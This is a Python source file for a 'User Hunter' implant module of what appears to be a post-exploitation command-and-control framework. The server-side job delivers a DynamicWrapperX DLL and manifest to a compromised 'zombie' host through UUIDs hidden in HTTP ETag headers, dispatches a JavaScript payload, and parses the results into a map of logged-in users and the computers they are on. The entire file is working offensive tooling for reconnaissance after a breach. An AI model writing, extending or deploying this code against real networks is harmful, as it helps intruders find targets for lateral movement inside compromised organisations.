import core.implant
import core.job
import string
import uuid

class UserHunterJob(core.job.Job):
    def create(self):
        self.fork32Bit = True
        self.options.set("DLLUUID", uuid.uuid4().hex)
        self.options.set("MANIFESTUUID", uuid.uuid4().hex)
        self.options.set("DIRECTORY", self.options.get('DIRECTORY').replace("\\", "\\\\").replace('"', '\\"'))

    def report(self, handler, data, sanitize = False):
        data = data.decode('latin-1')
        task = handler.get_header(self.options.get("UUIDHEADER"), False)

        if task == self.options.get("DLLUUID"):
            handler.send_file(self.options.get("DYNWRAPXDLL"))
            return

        if task == self.options.get("MANIFESTUUID"):
            handler.send_file(self.options.get("DYNWRAPXMANIFEST"))
            return

        if len(data) == 0:
            handler.reply(200)
            return

        if data == "Complete":
            super(UserHunterJob, self).report(handler, data)
        elif "***" in data:
            self.parse_sessions_data(data)

        handler.reply(200)

    def parse_sessions_data(self, data):
        self.print_good("Session data retrieved")
        sessions = data.split("***")
        for session in sessions:
            if session:
                user = session.split(":")[0]
                if "$" in user:
                    continue # not concerned with machine accounts
                comps = ", ".join(list(set(session.split(":")[1].split(","))))
                self.shell.print_plain(user + " => " + comps)
                self.results += user + " => " + comps + "\n"

    def done(self):
        self.display()

    def display(self):
        pass
        # try:
        #     self.print_good(self.data)
        # except:
        #     pass

class UserHunterImplant(core.implant.Implant):

    NAME = "User Hunter"
    DESCRIPTION = "Identifies and locates all logged in users"
    AUTHORS = ["TheNaterz"]
    STATE = "implant/gather/user_hunter"

    def load(self):
        self.options.register("DIRECTORY", "%TEMP%", "writeable directory on zombie", required=False)

        self.options.register("DYNWRAPXDLL", "data/bin/dynwrapx.dll", "relative path to dynwrapx.dll", required=True, advanced=True)
        self.options.register("DYNWRAPXMANIFEST", "data/bin/dynwrapx.manifest", "relative path to dynwrapx.manifest", required=True, advanced=True)

        self.options.register("UUIDHEADER", "ETag", "HTTP header for UUID", advanced=True)

        self.options.register("DLLUUID", "", "HTTP header for UUID", hidden=True)
        self.options.register("MANIFESTUUID", "", "UUID", hidden=True)

    def job(self):
        return UserHunterJob

    def run(self):
        workloads = {}
        workloads["js"] = "data/implant/gather/user_hunter.js"

        self.dispatch(workloads, self.job)
